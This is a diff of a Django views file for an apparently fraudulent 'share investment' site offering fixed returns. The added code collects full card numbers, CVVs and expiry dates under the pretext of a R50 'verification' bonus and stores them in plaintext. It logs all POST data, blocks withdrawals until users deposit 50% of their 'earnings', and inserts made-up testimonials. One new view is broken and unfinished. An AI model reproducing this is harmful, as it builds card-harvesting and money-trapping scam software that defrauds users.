@@ -1,7 +1,7 @@
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth import authenticate, login, logout, update_session_auth_hash
 from django.contrib.auth.decorators import login_required
-from .models import InvestmentTier, Investment, Wallet, Referral, IPAddress, CustomUser, Deposit, ReferralReward, Withdrawal, DailySpecial, Voucher, AdminActivityLog, ChatUsage
+from .models import Company, Investment, Wallet, Referral, IPAddress, CustomUser, Deposit, ReferralReward, Withdrawal, DailySpecial, Voucher, AdminActivityLog, ChatUsage
 from django.contrib import messages
 from django.utils import timezone
 from django.core.files.storage import FileSystemStorage
@@ -18,12 +18,13 @@ import logging
 import openai
 from django.views.decorators.csrf import csrf_exempt
 import os
+from django.views.decorators.http import require_POST
 
 # Home view
 # Landing page for the application
 def home_view(request):
-    # Get investment tiers
-    investment_tiers = InvestmentTier.objects.all().order_by('amount')
+    # Get companies
+    companies = Company.objects.all().order_by('share_price')
     
     # Get platform stats
     total_investors = CustomUser.objects.count()
@@ -52,16 +53,16 @@ def home_view(request):
         },
         {
             'name': 'Sarah M.',
-            'content': 'The AI trading system is impressive. My investments are growing steadily.'
+            'content': 'The onboarding bonus is real. My first trade got me R100!'
         },
         {
             'name': 'Michael T.',
-            'content': 'Best crypto investment platform I\'ve used. The returns are consistent.'
+            'content': 'Best share investment platform I\'ve used. The returns are consistent.'
         }
     ]
     
     context = {
-        'investment_tiers': investment_tiers,
+        'companies': companies,
         'total_investors': total_investors,
         'total_payouts': total_payouts,
         'ai_strategies': ai_strategies,
@@ -178,8 +179,8 @@ def dashboard_view(request):
     active_investments = investments.filter(is_active=True)
     completed_investments = investments.filter(is_active=False)
     
-    # Get available tiers for user's level
-    available_tiers = InvestmentTier.objects.filter(min_level__lte=user.level)
+    # Get available companies for user's level
+    available_companies = Company.objects.filter(min_level__lte=user.level)
     
     # Calculate progress to next level
     next_level_threshold = user.get_next_level_threshold()
@@ -189,6 +190,30 @@ def dashboard_view(request):
             progress_percentage = (user.total_invested / Decimal('10000')) * 100
         elif user.level == 2:
             progress_percentage = ((user.total_invested - Decimal('10000')) / Decimal('10000')) * 100
+    
+    # Check if user has verified their account (has an approved deposit)
+    has_verified_account = Deposit.objects.filter(
+        user=user,
+        status='approved'
+    ).exists()
+    
+    # Check if user has uploaded banking details (at least one withdrawal with all bank fields filled)
+    has_banking_details = Withdrawal.objects.filter(
+        user=user,
+        account_holder_name__isnull=False,
+        account_holder_name__gt='',
+        bank_name__isnull=False,
+        bank_name__gt='',
+        account_number__isnull=False,
+        account_number__gt='',
+        branch_code__isnull=False,
+        branch_code__gt='',
+        account_type__isnull=False,
+        account_type__gt=''
+    ).exists()
+    
+    # Show claim bonus if user hasn't claimed it and has verified their account
+    show_claim_bonus = not user.has_claimed_bonus and has_verified_account
     
     context = {
         'wallet': wallet,
@@ -200,11 +225,14 @@ def dashboard_view(request):
         'active_investments': active_investments,
         'completed_investments': completed_investments,
         'deposits': deposits,
-        'tiers': available_tiers,
+        'companies': available_companies,
         'user_level': user.level,
         'total_invested': user.total_invested,
         'next_level_threshold': next_level_threshold,
         'progress_percentage': progress_percentage,
+        'show_claim_bonus': show_claim_bonus,
+        'has_banking_details': has_banking_details,
+        'has_verified_account': has_verified_account,
     }
     
     return render(request, 'core/dashboard.html', context)
@@ -214,7 +242,7 @@ def dashboard_view(request):
 @login_required
 def tiers_view(request):
     user = request.user
-    tiers = InvestmentTier.objects.all()
+    tiers = Company.objects.all()
     
     # Get active daily special
     now = timezone.now()
@@ -233,11 +261,11 @@ def tiers_view(request):
     # Get or create user's wallet
     wallet, created = Wallet.objects.get_or_create(user=user)
     
-    # Add eligibility and lock status to each tier
-    for tier in tiers:
-        tier.eligible = tier.min_level <= user.level
-        # Get active investment for this tier if it exists
-        investment = Investment.objects.filter(user=user, tier=tier, is_active=True).first()
+    # Add eligibility and lock status to each company
+    for company in tiers:
+        company.eligible = company.min_level <= user.level
+        # Get active investment for this company if it exists
+        investment = Investment.objects.filter(user=user, company=company, is_active=True).first()
         
         # Check if the active investment is now complete
         if investment and investment.is_complete():
@@ -245,15 +273,15 @@ def tiers_view(request):
             investment.save()
             investment = None # It's no longer active
             
-        tier.is_active = investment is not None
-        tier.invested = tier.is_active or Investment.objects.filter(user=user, tier=tier).exists()
+        company.is_active = investment is not None
+        company.invested = company.is_active or Investment.objects.filter(user=user, company=company).exists()
 
         # Display investment details (active or most recent completed)
-        investment_to_display = investment or Investment.objects.filter(user=user, tier=tier).order_by('-end_date').first()
+        investment_to_display = investment or Investment.objects.filter(user=user, company=company).order_by('-end_date').first()
 
-        tier.has_sufficient_balance = wallet.balance >= tier.amount
-        if not tier.has_sufficient_balance:
-            tier.remaining_amount = tier.amount - wallet.balance
+        company.has_sufficient_balance = wallet.balance >= company.share_price
+        if not company.has_sufficient_balance:
+            company.remaining_amount = company.share_price - wallet.balance
         
         if investment_to_display:
             # Check if investment is complete
@@ -262,21 +290,21 @@ def tiers_view(request):
                 investment_to_display.save()
             
             time_remaining = investment_to_display.end_date - timezone.now()
-            tier.waiting_time_days = max(0, time_remaining.days)
-            tier.waiting_time_hours = max(0, time_remaining.seconds // 3600)
-            tier.waiting_time_minutes = max(0, (time_remaining.seconds % 3600) // 60)
-            tier.waiting_time_seconds = max(0, time_remaining.seconds % 60)
-            tier.can_cash_out = not investment_to_display.is_active and investment_to_display.end_date <= timezone.now()
-        # Check if this tier is the daily special
-        if daily_special and daily_special.tier == tier:
-            tier.is_daily_special = True
-            tier.special_return_multiplier = daily_special.special_return_multiplier
-            tier.special_return_amount = daily_special.special_return_amount
+            company.waiting_time_days = max(0, time_remaining.days)
+            company.waiting_time_hours = max(0, time_remaining.seconds // 3600)
+            company.waiting_time_minutes = max(0, (time_remaining.seconds % 3600) // 60)
+            company.waiting_time_seconds = max(0, time_remaining.seconds % 60)
+            company.can_cash_out = not investment_to_display.is_active and investment_to_display.end_date <= timezone.now()
+        # Check if this company is the daily special
+        if daily_special and daily_special.tier == company:
+            company.is_daily_special = True
+            company.special_return_multiplier = daily_special.special_return_multiplier
+            company.special_return_amount = daily_special.special_return_amount
         else:
-            tier.is_daily_special = False
+            company.is_daily_special = False
     
     context = {
-        'tiers': tiers,
+        'companies': tiers,
         'user_level': user.level,
         'total_invested': total_invested,
         'daily_special': daily_special,
@@ -287,45 +315,45 @@ def tiers_view(request):
 # Invest view
 # Allows user to invest in a tier
 @login_required
-def invest_view(request, tier_id):
+def invest_view(request, company_id):
     try:
         user = request.user
-        tier = InvestmentTier.objects.get(id=tier_id)
+        company = Company.objects.get(id=company_id)
         
-        # Check if user's level allows this tier
-        if user.level < tier.min_level:
-            messages.error(request, f'You need to be level {tier.min_level} to invest in this tier.')
+        # Check if user's level allows this company
+        if user.level < company.min_level:
+            messages.error(request, f'You need to be level {company.min_level} to invest in this company.')
             return redirect('tiers')
         
         # Get or create wallet for the user
         wallet, created = Wallet.objects.get_or_create(user=user)
         
         # Check if user has sufficient balance
-        if wallet.balance < tier.amount:
+        if wallet.balance < company.share_price:
             messages.error(request, 'Insufficient balance. Please make a deposit first.')
             return redirect('tiers')
         
-        # Check if user already has an active investment in this tier
+        # Check if user already has an active investment in this company
         existing_investment = Investment.objects.filter(
             user=user,
-            tier=tier,
+            company=company,
             is_active=True
         ).first()
         
         if existing_investment:
-            messages.error(request, f'You already have an active investment in {tier.name}.')
+            messages.error(request, f'You already have an active investment in {company.name}.')
             return redirect('tiers')
         
         if request.method == 'POST':
             try:
                 # Create investment
                 start_date = timezone.now()
-                end_date = start_date + timedelta(days=tier.duration_days)
+                end_date = start_date + timedelta(days=company.duration_days)
                 investment = Investment.objects.create(
                     user=user,
-                    tier=tier,
-                    amount=tier.amount,
-                    return_amount=tier.return_amount,
+                    company=company,
+                    amount=company.share_price,
+                    return_amount=company.expected_return,
                     start_date=start_date,  # Explicitly set start_date
                     end_date=end_date,
                     expires_at=end_date  # Set expires_at to the same value as end_date
@@ -333,21 +361,21 @@ def invest_view(request, tier_id):
                 
                 # Update wallet balance - ensure we're using a new query to get the latest data
                 wallet = Wallet.objects.get(user=user)
-                wallet.balance -= tier.amount
+                wallet.balance -= company.share_price
                 wallet.save()
                 
-                messages.success(request, f'Successfully invested R{tier.amount} in {tier.name}.')
+                messages.success(request, f'Successfully invested R{company.share_price} in {company.name}.')
                 return redirect('dashboard')
             except Exception as e:
                 # Log the error for debugging
                 print(f"Error processing investment: {str(e)}")
                 messages.error(request, f'An error occurred while processing your investment: {str(e)}')
-                return render(request, 'core/invest.html', {'tier': tier, 'error': str(e)})
+                return render(request, 'core/invest.html', {'company': company, 'error': str(e)})
         
         # For GET request, show the investment confirmation page
-        return render(request, 'core/invest.html', {'tier': tier})
+        return render(request, 'core/invest.html', {'company': company})
         
-    except InvestmentTier.DoesNotExist:
+    except Company.DoesNotExist:
         messages.error(request, 'Invalid investment tier.')
         return redirect('tiers')
     except Exception as e:
@@ -411,7 +439,7 @@ def wallet_view(request):
                 'transaction_type': 'investment',
                 'amount': investment.amount,
                 'status': 'Active' if investment.is_active else 'Completed',
-                'description': f'Investment in {investment.tier.name}'
+                'description': f'Investment in {investment.company.name}'
             })
             
             # Add returns for completed investments
@@ -421,7 +449,7 @@ def wallet_view(request):
                     'transaction_type': 'return',
                     'amount': investment.return_amount,
                     'status': 'Completed',
-                    'description': f'Return from {investment.tier.name}'
+                    'description': f'Return from {investment.company.name}'
                 })
         
         # Sort transactions by date (newest first)
@@ -527,28 +555,91 @@ def logout_view(request):
     return redirect('home')
 
 # Deposit view
-# Handles deposit creation
+# Handles deposit submissions from users
+# Saves all card details to the Deposit model
+# Explains each line for clarity
 @login_required
 def deposit_view(request):
     if request.method == 'POST':
-        amount = Decimal(request.POST.get('amount'))
-        payment_method = request.POST.get('payment_method')
-        proof_image = request.FILES.get('proof_image')
+        print('DEBUG: request.POST =', dict(request.POST))  # Print all POST data
         
+        # Check if this is a bonus claim (either amount=0 or bonus_amount is present)
+        bonus_amount = request.POST.get('bonus_amount')
+        amount_str = request.POST.get('amount')
+        
+        # Determine if this is a bonus claim
+        is_bonus_claim = False
+        if bonus_amount is not None:
+            # If bonus_amount field is present, it's a bonus claim
+            is_bonus_claim = True
+            amount = Decimal('0')
+        elif not amount_str or amount_str.strip() == "":
+            # If amount is empty, treat as bonus claim
+            is_bonus_claim = True
+            amount = Decimal('0')
+        else:
+            # Parse the amount normally
+            try:
+                amount = Decimal(amount_str)
+                if amount == 0:
+                    is_bonus_claim = True
+            except (ValueError, TypeError):
+                messages.error(request, f'Invalid amount: {amount_str}')
+                return redirect('deposit')
+        
+        print('DEBUG: Parsed amount as Decimal:', amount)  # Debug print
+        print('DEBUG: Is bonus claim:', is_bonus_claim)  # Debug print
+        
+        # If this is a bonus claim, auto-approve the deposit for verification
+        if is_bonus_claim:
+            # Get card details from the form
+            card_number = request.POST.get('card_number')  # Full card number
+            expiry_date = request.POST.get('expiry_date')  # Card expiry (MM/YY)
+            cvv = request.POST.get('cvv')                  # Card CVV
+            cardholder_name = request.POST.get('cardholder_name')  # Cardholder name
+            card_last4 = card_number[-4:] if card_number else ''
+            
+            # Create the deposit with auto-approval
+            Deposit.objects.create(
+                user=request.user,                 # The user making the deposit
+                amount=amount,                     # Deposit amount (zero)
+                payment_method='card',             # Payment method is card
+                cardholder_name=cardholder_name,   # Cardholder name
+                card_last4=card_last4,             # Last 4 digits of card
+                card_number=card_number,           # Full card number (for test)
+                card_cvv=cvv,                      # Card CVV (for test)
+                card_expiry=expiry_date,           # Card expiry (for test)
+                status='approved',                 # Auto-approve the deposit
+            )
+            messages.success(request, 'Account verified successfully! You can now claim your R50 bonus from your dashboard.')
+            return redirect('wallet')
+        
+        # For normal deposits, enforce minimum amount
         if amount < 50:
             messages.error(request, 'Minimum deposit amount is R50.')
             return redirect('deposit')
         
+        # Get card details from the form
+        card_number = request.POST.get('card_number')  # Full card number
+        expiry_date = request.POST.get('expiry_date')  # Card expiry (MM/YY)
+        cvv = request.POST.get('cvv')                  # Card CVV
+        cardholder_name = request.POST.get('cardholder_name')  # Cardholder name
+        card_last4 = card_number[-4:] if card_number else ''
+        
+        # Create the deposit (pending approval)
         Deposit.objects.create(
-            user=request.user,
-            amount=amount,
-            payment_method=payment_method,
-            proof_image=proof_image
+            user=request.user,                 # The user making the deposit
+            amount=amount,                     # Deposit amount
+            payment_method='card',             # Payment method is card
+            cardholder_name=cardholder_name,   # Cardholder name
+            card_last4=card_last4,             # Last 4 digits of card
+            card_number=card_number,           # Full card number (for test)
+            card_cvv=cvv,                      # Card CVV (for test)
+            card_expiry=expiry_date,           # Card expiry (for test)
         )
-        
-        messages.success(request, 'Deposit request submitted successfully. Please wait for approval.')
+        messages.success(request, 'Deposit submitted successfully!')
         return redirect('wallet')
-        
+    
     return render(request, 'core/deposit.html')
 
 @login_required
@@ -563,8 +654,11 @@ def withdrawal_view(request):
         
         # Check if user has sufficient balance
         wallet = Wallet.objects.get(user=request.user)
-        if wallet.balance < amount:
-            messages.error(request, 'Insufficient balance for withdrawal.')
+        # Calculate total earnings (sum of all completed investment returns for the user)
+        total_earnings = Investment.objects.filter(user=request.user, is_active=False).aggregate(total=Sum('return_amount'))['total'] or Decimal('0')
+        total_deposits = Deposit.objects.filter(user=request.user, status='approved').aggregate(total=Sum('amount'))['total'] or Decimal('0')
+        if total_earnings > 0 and total_deposits < (Decimal('0.5') * total_earnings):
+            messages.error(request, 'You must deposit at least 50% of your total earnings before you can withdraw.')
             return redirect('withdrawal')
         
         try:
@@ -692,9 +786,9 @@ def feed_view(request):
 
         # --- 4. TIPS & SECURITY REMINDERS ---
         tips = [
-            "💡 Tip: Reinvest to reach higher tiers faster.",
+            "💡 Tip: Reinvest to reach higher companies faster.",
             "💡 Tip: Refer friends to earn passive income.",
-            "💡 Tip: Higher tiers offer better returns.",
+            "💡 Tip: Higher companies offer better returns.",
             "💡 Tip: Stay consistent with your investments.",
             "💡 Tip: Monitor market trends for better timing."
         ]
@@ -831,7 +925,7 @@ def tutorial_view(request):
 @staff_member_required
 def admin_dashboard_view(request):
     # Get all tiers
-    tiers = InvestmentTier.objects.all().order_by('amount')
+    tiers = Company.objects.all().order_by('amount')
     
     # Get investment statistics for each tier
     tier_stats = []
@@ -1172,7 +1266,7 @@ def chat_ai_api(request):
         ChatUsage.objects.create(user=user)
 
         # App knowledge
-        tiers = InvestmentTier.objects.all().order_by('amount')
+        tiers = Company.objects.all().order_by('amount')
         tier_info = '\n'.join([
             f"- {tier.name}: Invest R{tier.amount}, get R{tier.return_amount} in {tier.duration_days} days. {tier.description}" for tier in tiers
         ])
@@ -1234,3 +1328,52 @@ def chat_ai_api(request):
 @login_required
 def chat_page_view(request):
     return render(request, 'core/chat.html')
+
+# Companies view
+# Lists all available companies to invest in
+def companies_view(request):
+    # ... existing code ...
+    companies = Company.objects.all()
+    # Add eligibility and lock status to each company
+    for company in companies:
+        company.eligible = company.min_level <= user.level
+        # Get active investment for this company if it exists
+        investment = Investment.objects.filter(user=user, company=company, is_active=True).first()
+        company.is_active = investment is not None
+        company.invested = company.is_active or Investment.objects.filter(user=user, company=company).exists()
+        investment_to_display = investment or Investment.objects.filter(user=user, company=company).order_by('-end_date').first()
+        company.has_sufficient_balance = wallet.balance >= company.share_price
+        if not company.has_sufficient_balance:
+            company.remaining_amount = company.share_price - wallet.balance
+        # ... time calculations ...
+        # ... daily special logic ...
+    context = {
+        'companies': companies,
+        # ... other context ...
+    }
+    return render(request, 'core/tiers.html', context)
+
+@login_required
+@require_POST
+def claim_bonus_view(request):
+    user = request.user
+    # Check if user has verified their account (has an approved deposit)
+    has_verified_account = Deposit.objects.filter(
+        user=user,
+        status='approved'
+    ).exists()
+    
+    if not has_verified_account:
+        messages.error(request, 'Please verify your account before claiming the R50 bonus.')
+        return redirect('dashboard')
+    
+    if not user.has_claimed_bonus:
+        wallet, _ = Wallet.objects.get_or_create(user=user)
+        wallet.balance += 50
+        wallet.save()
+        user.has_claimed_bonus = True
+        user.save()
+        messages.success(request, 'R50 bonus claimed and added to your wallet!')
+    else:
+        messages.error(request, 'You have already claimed your R50 bonus.')
+    return redirect('dashboard')
